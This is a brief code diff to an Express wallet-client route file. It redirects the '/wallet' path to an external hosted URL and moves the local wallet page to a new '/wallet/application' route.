@@ -17,6 +17,11 @@ export function registerWalletClientRoutes(app: Express, config: RuntimeConfig):
 
   app.get("/wallet", (_request: Request, response: Response) => {
     noStore(response);
+    return response.redirect(302, "https://ledgerline-compliance.sthomas935.chatgpt.site/wallet");
+  });
+
+  app.get("/wallet/application", (_request: Request, response: Response) => {
+    noStore(response);
     return response.sendFile(join(walletAssetsDirectory, "index.html"));
   });
 
